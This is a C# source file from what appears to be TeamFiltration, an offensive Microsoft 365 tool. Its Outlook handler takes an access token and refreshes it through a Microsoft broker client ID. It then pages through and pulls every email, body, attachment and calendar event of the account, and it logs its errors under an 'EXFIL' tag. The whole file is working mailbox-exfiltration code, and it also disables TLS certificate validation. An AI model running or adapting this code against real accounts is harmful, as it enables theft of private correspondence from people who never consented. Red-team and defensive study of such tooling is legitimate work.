using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.OWA;
using TeamFiltration.Helpers;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Models.Teams;

namespace TeamFiltration.Handlers
{
    public class RateLimitData
    {
        public int RateLimitRemaining { get; set; }
        public DateTime RateLimitReset { get; set; }
    }
    class OWAHandler
    {

        public HttpClient _outlookClient { get; set; }
        public BearerTokenResp _bearerToken { get; set; }
        public GlobalArgumentsHandler _teamFiltrationConfig { get; set; }
        public DatabaseHandler _databaseHandler { get; set; }


        public OWAHandler(BearerTokenResp getBearToken, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler databaseHandler)
        {
            _teamFiltrationConfig = teamFiltrationConfig;
            _databaseHandler = databaseHandler;
            _bearerToken = getBearToken;

            // This is for debug , eg burp
            var proxy = new WebProxy
            {
                Address = new Uri(teamFiltrationConfig.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = teamFiltrationConfig.DebugMode
            };

            _outlookClient = new HttpClient(httpClientHandler);
            _outlookClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {getBearToken.access_token}");
        }


        public async Task<bool> RefreshAccessToken()
        {
            var httpClientHandler = new HttpClientHandler
            {

                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,

            };


            var refreshClient = new HttpClient(httpClientHandler);

            var loginPostBody = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("grant_type", "refresh_token"),
                new KeyValuePair<string, string>("refresh_token", _bearerToken.refresh_token),
                new KeyValuePair<string, string>("redirect_uri", "ms-appx-web://Microsoft.AAD.BrokerPlugin/1fec8e78-bce4-4aaf-ab1b-5451cc387264"),
                new KeyValuePair<string, string>("client_id",  "1fec8e78-bce4-4aaf-ab1b-5451cc387264"),
                new KeyValuePair<string, string>("resource", "https://outlook.office365.com"),
                new KeyValuePair<string, string>("scope", "openid"),
                new KeyValuePair<string, string>("windows_api_version", "2.0"),
                new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),
            });


            refreshClient.DefaultRequestHeaders.Add("Accept", "application/json");
            refreshClient.DefaultRequestHeaders.Add("User-Agent", _teamFiltrationConfig.TeamFiltrationConfig.UserAgent);

            var httpResp = await refreshClient.PostAsync(_teamFiltrationConfig.GetBaseUrl(), loginPostBody);
            var contentResp = await httpResp.Content.ReadAsStringAsync();

            if (httpResp.IsSuccessStatusCode)
            {
                _bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);

                _outlookClient.DefaultRequestHeaders.Remove("Authorization");
                _outlookClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {_bearerToken.access_token}");

                return true;
            }
            return false;

        }

        public async Task<EventsResp> GetCalendarEvents()
        {
            var getCalendarEventsResq = await _outlookClient.PollyGetAsync($"https://outlook.office.com/api/v2.0/me/events");


            if (getCalendarEventsResq.IsSuccessStatusCode)
            {
                var getCalendarEventsResp = await getCalendarEventsResq.Content.ReadAsStringAsync();
                var getCalendarEventsDataResp = JsonConvert.DeserializeObject<EventsResp>(getCalendarEventsResp);



                bool fetchedAll = false;
                if (string.IsNullOrEmpty(getCalendarEventsDataResp.odatanextLink))
                    fetchedAll = true;


                int skipValue = 20;
                while (!fetchedAll)
                {

                    var getAllEmailsReqNext = await _outlookClient.PollyGetAsync("https://outlook.office.com/api/v2.0/me/events?$top=20&$skip=" + skipValue);
                    var getAllEmailsRespNext = await getAllEmailsReqNext.Content.ReadAsStringAsync();
                    var getAllEmailsRespData = JsonConvert.DeserializeObject<EventsResp>(getAllEmailsRespNext);
                    getCalendarEventsDataResp.value.AddRange(getAllEmailsRespData.value);
                    getCalendarEventsDataResp.odatanextLink = getAllEmailsRespData.odatanextLink;
                    skipValue += 20;
                    if (string.IsNullOrEmpty(getCalendarEventsDataResp.odatanextLink))
                        fetchedAll = true;
                }
                return getCalendarEventsDataResp;
            }

            return null;

        }

        public async Task<EmailResp> GetEmailAttachmentData(string msgId, string attachemntId)
        {

            var getEmailAttachmentResq = await _outlookClient.PollyGetAsync($"https://outlook.office.com/api/v2.0/me/messages/{msgId}/attachments/{attachemntId}");
            var getEmailAttachmentResp = await getEmailAttachmentResq.Content.ReadAsStringAsync();
            var getEmailAttachmentDataResp = JsonConvert.DeserializeObject<EmailResp>(getEmailAttachmentResp);

            return getEmailAttachmentDataResp;
        }


        public async Task<AttachResp> GetEmailAttachments(string msgid)
        {

            var getAttachmentsReq = await _outlookClient.PollyGetAsync($"https://outlook.office.com/api/v2.0/me/messages/{msgid}/attachments?");
            var getAttachmentsResp = await getAttachmentsReq.Content.ReadAsStringAsync();
            var getAttachmentsDataResp = JsonConvert.DeserializeObject<AttachResp>(getAttachmentsResp);

            return getAttachmentsDataResp;
        }

        public async Task<(EmailResp emailResp, RateLimitData rateLimitData)> GetEmailBody(string msgid)
        {
            int attempts = 0;


        start:
            var getEmailBodyReq = await _outlookClient.PollyGetAsync($"https://outlook.office.com/api/v2.0/me/messages/{msgid}?$select=body,from,subject,id,ReceivedDateTime,HasAttachments");
            var getEmailBodyResp = await getEmailBodyReq.Content.ReadAsStringAsync();
            if (getEmailBodyResp.Contains("ApplicationThrottled") || string.IsNullOrEmpty(getEmailBodyResp) || string.IsNullOrEmpty("Network error communicating with endpoint"))
            {
                Thread.Sleep(2000);
                attempts++;
                if (attempts < 4)
                    goto start;
                else
                    return (new EmailResp() { }, new RateLimitData() { });

            }

            getEmailBodyReq.Headers.TryGetValues("Rate-Limit-Reset", out var rateLimitResetEnum);
            getEmailBodyReq.Headers.TryGetValues("Rate-Limit-Remaining", out var rateLimitRemainingEnum);
            if (rateLimitRemainingEnum?.Count() > 0 && rateLimitResetEnum?.Count() > 0)
            {
                var getEmailBodyRespData = JsonConvert.DeserializeObject<EmailResp>(getEmailBodyResp);
                var rateLimitData = new RateLimitData()
                {
                    RateLimitRemaining = Convert.ToInt32(rateLimitRemainingEnum.FirstOrDefault()),
                    RateLimitReset = Convert.ToDateTime(rateLimitResetEnum.FirstOrDefault())

                };
                return (getEmailBodyRespData, rateLimitData);
            }
            else
            {
                return (new EmailResp() { }, new RateLimitData() { });
            }

        }

        public async Task<AllEmailsResp> GetAllEmails(int owaMaxLimit)
        {

            var getAllEmailsReq = await _outlookClient.PollyGetAsync("https://outlook.office.com/api/v2.0/me/messages?$top=500&$select=id");
            var getAllEmailsResp = await getAllEmailsReq.Content.ReadAsStringAsync();

            if (getAllEmailsReq.IsSuccessStatusCode)
            {
                var getAllEmailsDataResp = JsonConvert.DeserializeObject<AllEmailsResp>(getAllEmailsResp);

                bool fetchedAll = false;
                if (string.IsNullOrEmpty(getAllEmailsDataResp.odatanextLink))
                    fetchedAll = true;


                int skipValue = 500;
                while (!fetchedAll)
                {

                    var getAllEmailsReqNext = await _outlookClient.PollyGetAsync("https://outlook.office.com/api/v2.0/me/messages?$top=500&$skip=" + skipValue + "&$select=id");
                    var getAllEmailsRespNext = await getAllEmailsReqNext.Content.ReadAsStringAsync();
                    var getAllEmailsRespData = JsonConvert.DeserializeObject<AllEmailsResp>(getAllEmailsRespNext);
                    getAllEmailsDataResp.value.AddRange(getAllEmailsRespData.value);
                    getAllEmailsDataResp.odatanextLink = getAllEmailsRespData.odatanextLink;
                    skipValue += 500;
                    if (string.IsNullOrEmpty(getAllEmailsDataResp.odatanextLink) || getAllEmailsDataResp.value.Count() >= owaMaxLimit)
                        fetchedAll = true;
                }
                return getAllEmailsDataResp;
            }
            else
            {
                var errorResp = JsonConvert.DeserializeObject<OWAErrorResponse>(getAllEmailsResp);

                _databaseHandler.WriteLog(new Log("EXFIL", $"Got error code '{errorResp.error.code}' from Outlook API '{errorResp.error.message}'", "") { }, true);
                return new AllEmailsResp() { value = new List<EmailResp>() { } };
            }
        }

    }
}
